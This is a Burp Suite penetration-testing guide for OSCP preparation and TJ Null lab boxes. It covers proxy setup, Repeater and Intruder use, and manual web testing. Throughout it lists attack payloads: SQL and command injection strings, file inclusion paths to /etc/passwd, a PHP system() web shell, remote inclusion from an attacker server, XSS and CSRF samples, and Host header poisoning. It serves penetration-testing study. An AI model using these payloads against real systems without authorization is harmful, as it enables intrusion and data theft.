@@ -1,0 +1,811 @@
+# OSCP Burp Suite Complete Guide - TJ Null Proven Techniques
+
+Based on extensive research from GitHub, OffSec, YouTube, CSDN, Medium, and Reddit across Chinese, English, Hindi, Spanish, and French sources. This guide focuses on Burp Suite Community Edition techniques proven effective in TJ Null boxes and OSCP exams.
+
+## Table of Contents
+- [Burp Suite Setup and Configuration](#burp-suite-setup-and-configuration)
+- [Proxy and Interception Mastery](#proxy-and-interception-mastery)
+- [Repeater for Manual Testing](#repeater-for-manual-testing)
+- [Intruder for Automated Attacks](#intruder-for-automated-attacks)
+- [Web Application Discovery](#web-application-discovery)
+- [Manual Vulnerability Testing](#manual-vulnerability-testing)
+- [Advanced Burp Techniques](#advanced-burp-techniques)
+- [TJ Null Burp Patterns](#tj-null-burp-patterns)
+- [Common Issues and Solutions](#common-issues-and-solutions)
+
+## Burp Suite Setup and Configuration
+
+### Phase 1: Installation and Initial Setup
+
+**Step 1: Installation (Copy-Paste Ready)**
+```bash
+# Install Burp Suite Community Edition (Kali Linux)
+sudo apt update && sudo apt install burpsuite
+
+# Start Burp Suite
+burpsuite &
+
+# Alternative: Download from PortSwigger
+wget https://portswigger.net/burp/releases/download?product=community -O burpsuite.jar
+java -jar burpsuite.jar
+```
+
+**Step 2: Basic Configuration**
+```
+1. Start Burp Suite
+2. Choose "Temporary project" for OSCP exam
+3. Use Burp defaults
+4. Navigate to Proxy → Options
+5. Verify Interface: 127.0.0.1:8080 (Running: checked)
+6. Navigate to Proxy → HTTP history to see traffic
+```
+
+### Phase 2: Browser Configuration
+
+**Step 1: Firefox Proxy Configuration**
+```
+Firefox Configuration:
+1. Open Firefox Preferences
+2. Search "proxy" in settings
+3. Choose "Manual proxy configuration"
+4. HTTP Proxy: 127.0.0.1, Port: 8080
+5. Check "Use this proxy server for all protocols"
+6. Check "Proxy DNS when using SOCKS v5"
+7. Click OK
+```
+
+**Step 2: SSL Certificate Installation**
+```bash
+# Navigate to Burp certificate page
+curl http://127.0.0.1:8080 # In browser
+
+# Download CA certificate (click "CA Certificate")
+# In Firefox:
+# 1. Settings → Privacy & Security → Certificates → View Certificates
+# 2. Authorities → Import
+# 3. Select downloaded certificate
+# 4. Check "Trust this CA to identify websites"
+# 5. Click OK
+```
+
+**Step 3: Alternative Browser Setup (Chromium)**
+```bash
+# Start Chromium with proxy settings
+chromium-browser --proxy-server="127.0.0.1:8080" --ignore-certificate-errors
+
+# Or use command line for testing
+curl --proxy 127.0.0.1:8080 -k https://target.com
+```
+
+## Proxy and Interception Mastery
+
+### Phase 1: Basic Interception
+
+**Step 1: Enabling Interception**
+```
+1. Navigate to Proxy → Intercept
+2. Ensure "Intercept is on"
+3. Browse to target website
+4. Review intercepted request
+5. Modify if needed or click "Forward"
+6. Turn off intercept: "Intercept is off"
+```
+
+**Step 2: Selective Interception Rules**
+```
+Create Interception Rules:
+1. Proxy → Options → Intercept Client Requests
+2. Add rule: "And URL Is in target scope"
+3. Add rule: "And file extension Is not in: jpg,png,gif,css,js"
+4. This reduces noise from static files
+
+Target Scope Configuration:
+1. Target → Scope
+2. Add target: http://target-ip
+3. Check "Use advanced scope control"
+```
+
+### Phase 2: Request Analysis and Modification
+
+**Step 1: Request Components Analysis**
+```
+Key Elements to Analyze:
+- HTTP Method (GET, POST, PUT, DELETE)
+- URL and parameters
+- Headers (User-Agent, Cookie, Authorization)
+- POST body data
+- Content-Type header
+- Custom headers
+
+Example Intercepted Request:
+GET /login.php?username=admin&password=test HTTP/1.1
+Host: 192.168.1.100
+User-Agent: Mozilla/5.0...
+Cookie: PHPSESSID=abc123
+```
+
+**Step 2: Common Request Modifications**
+```bash
+# Change HTTP method
+POST /admin/delete.php HTTP/1.1  # Instead of GET
+
+# Modify parameters
+username=admin'--&password=ignored  # SQL injection test
+
+# Add/modify headers
+X-Forwarded-For: 127.0.0.1  # Bypass IP restrictions
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+
+# Modify User-Agent
+User-Agent: <?php system($_GET['cmd']); ?>  # For log poisoning
+
+# Content-Type manipulation
+Content-Type: application/json  # Change from form data
+```
+
+## Repeater for Manual Testing
+
+### Phase 1: Basic Repeater Usage
+
+**Step 1: Sending Requests to Repeater**
+```
+1. Intercept or find request in HTTP history
+2. Right-click request
+3. Select "Send to Repeater"
+4. Navigate to Repeater tab
+5. Modify request as needed
+6. Click "Send" to see response
+```
+
+**Step 2: Repeater Interface Navigation**
+```
+Repeater Layout:
+- Left panel: Request editor
+- Right panel: Response viewer
+- Bottom: Response tabs (Render, Raw, Hex)
+- Top: Request tabs for multiple requests
+
+Useful Buttons:
+- Send: Execute request
+- Cancel: Stop current request
+- Target: Change target host/port
+- ∞: Show response in browser
+```
+
+### Phase 2: Manual Vulnerability Testing
+
+**Step 1: SQL Injection Testing**
+```
+Original Request:
+GET /product.php?id=1 HTTP/1.1
+Host: 192.168.1.100
+
+Modified Requests (test in sequence):
+1. GET /product.php?id=1' HTTP/1.1
+2. GET /product.php?id=1 AND 1=1-- HTTP/1.1  
+3. GET /product.php?id=1 AND 1=2-- HTTP/1.1
+4. GET /product.php?id=1 ORDER BY 5-- HTTP/1.1
+5. GET /product.php?id=1 UNION SELECT 1,2,3,4-- HTTP/1.1
+
+Look for:
+- Error messages in response
+- Different response lengths
+- Different content between true/false conditions
+```
+
+**Step 2: Command Injection Testing**
+```bash
+# Test command injection in various parameters
+# Original: ping=127.0.0.1
+# Tests:
+ping=127.0.0.1;whoami
+ping=127.0.0.1|whoami
+ping=127.0.0.1&whoami
+ping=127.0.0.1&&whoami
+ping=127.0.0.1`whoami`
+ping=127.0.0.1$(whoami)
+
+# URL encode for successful execution
+ping=127.0.0.1%3Bwhoami
+ping=127.0.0.1%7Cwhoami
+```
+
+**Step 3: File Inclusion Testing**
+```bash
+# Local File Inclusion (LFI) testing
+# Original: page=home
+# Tests:
+page=../../../etc/passwd
+page=....//....//....//etc/passwd
+page=/etc/passwd
+page=php://filter/convert.base64-encode/resource=index.php
+page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+# Remote File Inclusion (RFI) testing  
+page=http://your-server/shell.txt
+page=ftp://your-server/shell.txt
+```
+
+### Phase 3: Response Analysis
+
+**Step 1: Response Status Codes**
+```
+Important Status Codes:
+200 OK - Request successful
+302 Found - Redirect (check Location header)
+400 Bad Request - Invalid request syntax
+401 Unauthorized - Authentication required
+403 Forbidden - Access denied
+404 Not Found - Resource not found
+500 Internal Server Error - Server error (potential vulnerability)
+```
+
+**Step 2: Response Header Analysis**
+```
+Security Headers to Check:
+X-Frame-Options: DENY/SAMEORIGIN
+X-XSS-Protection: 1; mode=block  
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000
+Content-Security-Policy: default-src 'self'
+
+Interesting Headers:
+Server: Apache/2.4.7 (version disclosure)
+X-Powered-By: PHP/5.6.0 (technology disclosure)
+Set-Cookie: admin=true (privilege escalation)
+Location: /admin/panel.php (directory disclosure)
+```
+
+## Intruder for Automated Attacks
+
+### Phase 1: Intruder Configuration
+
+**Step 1: Setting Up Attack Positions**
+```
+1. Send request to Intruder
+2. Navigate to Intruder → Positions
+3. Click "Clear §" to remove auto-positions
+4. Highlight parameter value
+5. Click "Add §" to mark attack position
+6. Select attack type
+
+Attack Types:
+- Sniper: Single position, one payload set
+- Battering ram: Multiple positions, same payload
+- Pitchfork: Multiple positions, different payload sets (parallel)
+- Cluster bomb: Multiple positions, different payloads (all combinations)
+```
+
+**Step 2: Payload Configuration**
+```
+Payload Types:
+1. Simple list - Custom wordlist
+2. Runtime file - Load from file  
+3. Numbers - Sequential/random numbers
+4. Dates - Date ranges
+5. Brute forcer - Character combinations
+6. NULL payloads - For timing attacks
+
+Common Payload Sources:
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/share/wordlists/fasttrack.txt
+/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+```
+
+### Phase 2: Common Attack Scenarios
+
+**Step 1: Directory Brute Forcing**
+```
+Request Setup:
+GET /§directory§/ HTTP/1.1
+Host: 192.168.1.100
+
+Payload Configuration:
+- Type: Simple list
+- Paste common directories:
+admin
+administrator  
+backup
+config
+test
+dev
+old
+tmp
+upload
+includes
+js
+css
+images
+
+Grep Matching:
+- Add "200" to match successful responses
+- Add "Directory" to identify directory listings
+```
+
+**Step 2: Username/Password Brute Force**
+```
+Request Setup:
+POST /login.php HTTP/1.1
+Host: 192.168.1.100
+Content-Type: application/x-www-form-urlencoded
+
+username=§user§&password=§pass§
+
+Attack Type: Pitchfork (parallel testing)
+
+Payload Set 1 (users):
+admin
+administrator
+root
+user
+test
+
+Payload Set 2 (passwords):  
+admin
+password
+123456
+password123
+admin123
+```
+
+**Step 3: Parameter Fuzzing**
+```
+Request Setup:
+GET /search.php?q=test&§param§=§value§ HTTP/1.1
+
+Attack Type: Cluster bomb (all combinations)
+
+Payload Set 1 (parameter names):
+id
+user
+admin
+debug
+cmd
+exec
+file
+page
+
+Payload Set 2 (parameter values):
+1
+admin
+true
+../../../etc/passwd
+<?php phpinfo(); ?>
+```
+
+### Phase 3: Results Analysis
+
+**Step 1: Response Analysis**
+```
+Key Metrics:
+- Status: HTTP response codes
+- Error: Response errors
+- Timeout: Request timeouts  
+- Length: Response length
+- Words: Word count in response
+
+Sorting and Filtering:
+1. Click column headers to sort
+2. Right-click → "Add item to filter"
+3. Filter by status code, length, etc.
+4. Look for outliers (different lengths/status codes)
+```
+
+**Step 2: Identifying Successful Attacks**
+```bash
+# Look for these indicators:
+# Different status codes (200 vs 404)
+# Different response lengths
+# Different response times
+# Error messages or success messages
+# Redirects to admin panels
+# Debug information exposure
+
+# Example: Directory brute force success
+Status: 200, Length: 1523 - /admin/
+Status: 200, Length: 2841 - /backup/  
+Status: 403, Length: 278  - /config/
+Status: 404, Length: 1043 - /notfound/
+```
+
+## Web Application Discovery
+
+### Phase 1: Manual Spidering
+
+**Step 1: Site Map Building**
+```
+1. Navigate to Target tab
+2. Browse application normally while proxy is on
+3. View Site Map to see discovered content
+4. Right-click folders → "Spider this branch"
+5. Monitor Spider status and results
+
+Manual Discovery Actions:
+- Click all links and buttons
+- Submit forms with test data
+- Check source code for hidden links
+- Test different user roles/privileges
+```
+
+**Step 2: Forced Browsing**
+```bash
+# Use Intruder for forced browsing
+# Common files to search for:
+robots.txt
+sitemap.xml
+admin.php
+login.php
+config.php
+backup.php
+test.php
+phpinfo.php
+info.php
+.env
+.htaccess
+web.config
+
+# Common directories:
+admin/
+administrator/
+backup/
+config/
+test/
+dev/
+old/
+tmp/
+upload/
+includes/
+```
+
+### Phase 2: Parameter Discovery
+
+**Step 1: GET Parameter Discovery**
+```bash
+# Use Intruder to discover hidden parameters
+# Base request: GET /page.php?known_param=value
+# Test: GET /page.php?known_param=value&§param§=test
+
+Common Parameters:
+id
+user
+admin
+debug
+cmd
+exec
+file
+page
+include
+cat
+dir
+path
+action
+module
+```
+
+**Step 2: POST Parameter Discovery**
+```bash
+# Hidden form fields discovery
+# Base request body: username=test&password=test
+# Test: username=test&password=test&§param§=test
+
+Common Hidden Parameters:
+csrf_token
+hidden
+admin
+role
+privilege
+debug
+test
+action
+submit
+```
+
+## Manual Vulnerability Testing
+
+### Phase 1: Input Validation Testing
+
+**Step 1: XSS Testing**
+```html
+<!-- Basic XSS payloads for manual testing -->
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+'><script>alert('XSS')</script>
+javascript:alert('XSS')
+"><img src=x onerror=alert('XSS')>
+
+<!-- Testing in different contexts -->
+<!-- URL parameter: ?search=<script>alert('XSS')</script> -->
+<!-- Form input: <img src=x onerror=alert('XSS')> -->
+<!-- Header injection: User-Agent: <script>alert('XSS')</script> -->
+```
+
+**Step 2: CSRF Testing**
+```html
+<!-- Generate CSRF PoC -->
+<!-- 1. Capture legitimate request -->
+<!-- 2. Create HTML form with same parameters -->
+<!-- 3. Test if request executes without proper token validation -->
+
+<form action="http://target/admin/delete_user.php" method="POST">
+    <input type="hidden" name="user_id" value="123">
+    <input type="hidden" name="action" value="delete">
+    <input type="submit" value="Delete User">
+</form>
+```
+
+**Step 3: File Upload Testing**
+```bash
+# Create test files for upload testing
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+echo '<?php phpinfo(); ?>' > info.php
+
+# Test different extensions
+shell.php5
+shell.phtml  
+shell.inc
+shell.php.jpg
+shell.jpg.php
+
+# Test different content types
+Content-Type: image/jpeg (for PHP shell)
+Content-Type: text/plain
+Content-Type: application/octet-stream
+```
+
+### Phase 2: Business Logic Testing
+
+**Step 1: Authentication Bypass**
+```bash
+# Test authentication bypass techniques
+# 1. Parameter pollution
+username=admin&username=user&password=test
+
+# 2. Array manipulation  
+username[]=admin&password[]=test
+
+# 3. Empty password
+username=admin&password=
+
+# 4. Admin parameter injection
+username=user&password=test&admin=true&role=admin
+```
+
+**Step 2: Price Manipulation**
+```bash
+# E-commerce price manipulation
+# Original: price=100&quantity=1
+# Tests:
+price=-100&quantity=1
+price=0.01&quantity=1000
+quantity=-1&price=100
+
+# Discount code testing
+discount=100
+discount=ADMIN
+discount=../../../etc/passwd
+```
+
+## Advanced Burp Techniques
+
+### Phase 1: Session Handling
+
+**Step 1: Session Token Analysis**
+```
+1. Navigate to Sequencer
+2. Select session token parameter
+3. Capture 100+ tokens
+4. Analyze randomness and entropy
+5. Look for patterns or predictable values
+
+Token Types to Test:
+- Session IDs
+- CSRF tokens
+- Password reset tokens
+- API keys
+- JWT tokens
+```
+
+**Step 2: Session Fixation Testing**
+```bash
+# Test session fixation vulnerabilities
+# 1. Note session ID before login
+# 2. Login with valid credentials  
+# 3. Check if session ID changes after login
+# 4. If same session ID: potential session fixation
+
+# Example test:
+# Before login: PHPSESSID=abc123
+# After login: PHPSESSID=abc123 (VULNERABLE)
+# Secure: PHPSESSID=xyz789 (session regenerated)
+```
+
+### Phase 2: Advanced Request Manipulation
+
+**Step 1: HTTP Method Override**
+```bash
+# Test HTTP method override
+# Original: GET /admin/users HTTP/1.1
+# Tests:
+POST /admin/users HTTP/1.1
+X-HTTP-Method-Override: DELETE
+
+PUT /admin/users HTTP/1.1
+
+DELETE /admin/users HTTP/1.1
+```
+
+**Step 2: Host Header Injection**
+```bash
+# Test host header injection
+# Original: Host: target.com
+# Tests:
+Host: attacker.com
+Host: target.com:attacker.com
+Host: target.com.attacker.com
+
+# Password reset poisoning
+Host: attacker.com
+# Check if reset links use Host header value
+```
+
+### Phase 3: Response Manipulation
+
+**Step 1: Response Modification**
+```
+1. Intercept response from server
+2. Navigate to Proxy → Options
+3. Check "Intercept responses..."
+4. Modify response body/headers
+5. Forward modified response to browser
+
+Common Response Modifications:
+- Change hidden form values  
+- Modify JavaScript restrictions
+- Add/remove security headers
+- Change status codes
+```
+
+## TJ Null Burp Patterns
+
+### Common TJ Null Box Burp Scenarios
+
+**Pattern 1: Login Form SQL Injection**
+1. Intercept login POST request
+2. Send to Repeater
+3. Test SQL injection in username/password fields
+4. Use payloads: `admin'--`, `admin'/*`, `' OR '1'='1'--`
+5. Bypass authentication to reach admin functionality
+
+**Pattern 2: File Upload with Filter Bypass**
+1. Intercept file upload request
+2. Try basic PHP shell upload (blocked)
+3. Use Repeater to test bypass techniques:
+   - Change Content-Type to image/jpeg
+   - Use double extensions: shell.php.jpg
+   - Try alternative extensions: .php5, .phtml
+4. Upload successful web shell
+
+**Pattern 3: Parameter Pollution/Hidden Parameters**
+1. Discover application functionality via spidering
+2. Use Intruder to discover hidden parameters
+3. Test admin=true, role=admin, debug=1
+4. Find parameter that elevates privileges
+5. Access restricted functionality
+
+### TJ Null Difficulty Recognition via Burp
+
+**Easy Box Indicators:**
+- Clear error messages in responses
+- Basic HTML forms with obvious parameters
+- Direct file upload functionality visible
+- Standard authentication mechanisms
+- Minimal filtering on inputs
+
+**Medium Box Indicators:**
+- Custom web applications requiring analysis
+- Hidden parameters need discovery via Intruder
+- Multiple-step exploitation chains
+- Basic input filtering present
+- Session management testing required
+
+**Hard Box Indicators:**
+- Complex custom applications
+- Advanced filtering requiring bypass techniques
+- Multi-parameter vulnerability chains
+- Custom authentication mechanisms
+- Business logic vulnerabilities requiring deep analysis
+
+## Common Issues and Solutions
+
+### Issue 1: Certificate Problems
+
+**Problem:** SSL certificate errors preventing HTTPS interception
+
+**Solutions:**
+```bash
+# Install Burp certificate properly
+1. Navigate to http://127.0.0.1:8080 in browser
+2. Download CA certificate
+3. Install in browser certificate store
+4. Trust for identifying websites
+
+# Alternative: Ignore certificate errors
+curl -k --proxy 127.0.0.1:8080 https://target.com
+
+# Firefox: about:config → security.tls.insecure_fallback_hosts → add target domain
+```
+
+### Issue 2: Proxy Connection Issues
+
+**Problem:** Browser not routing traffic through Burp
+
+**Solutions:**
+```bash
+# Verify proxy settings
+netstat -tlnp | grep 8080
+
+# Test proxy manually
+curl --proxy 127.0.0.1:8080 http://target.com
+
+# Check browser proxy configuration
+# Firefox: Settings → Network Settings → Manual proxy configuration
+
+# Clear browser cache and restart
+rm -rf ~/.mozilla/firefox/*/cert9.db
+```
+
+### Issue 3: Performance Issues
+
+**Problem:** Burp running slowly or consuming too much memory
+
+**Solutions:**
+```bash
+# Increase Java heap size
+java -Xmx2g -jar burpsuite.jar
+
+# Disable unnecessary features
+# Turn off Proxy → Intercept when not needed
+# Limit Spider scope to reduce crawling
+# Use filters to reduce HTTP history noise
+
+# Clear HTTP history regularly
+# Proxy → HTTP history → Clear history
+```
+
+### Issue 4: Target Scope Issues
+
+**Problem:** Too much traffic or out-of-scope requests
+
+**Solutions:**
+```
+# Configure proper scope
+1. Target → Scope
+2. Add target: http://target-ip
+3. Check "Use advanced scope control"
+
+# Configure intercept filters
+1. Proxy → Options → Intercept Client Requests
+2. Add: "And URL Is in target scope"
+3. Add: "And file extension Is not in: jpg,png,gif,css,js"
+```
+
+### Issue 5: Request/Response Size Limits
+
+**Problem:** Large requests or responses getting truncated
+
+**Solutions:**
+```
+# Increase display limits
+1. User options → Display
+2. Increase "HTTP message display" limits
+3. Uncheck "Truncate requests/responses"
+
+# For large file uploads
+1. Proxy → Options → Miscellaneous
+2. Uncheck size restrictions
+3. Increase timeout values
+```
+
+Remember: Burp Suite is your primary web application testing tool in OSCP. Master the systematic approach: proxy interception → manual testing in Repeater → automated attacks with Intruder → thorough analysis. The key is understanding the application behavior and methodically testing each component for vulnerabilities!
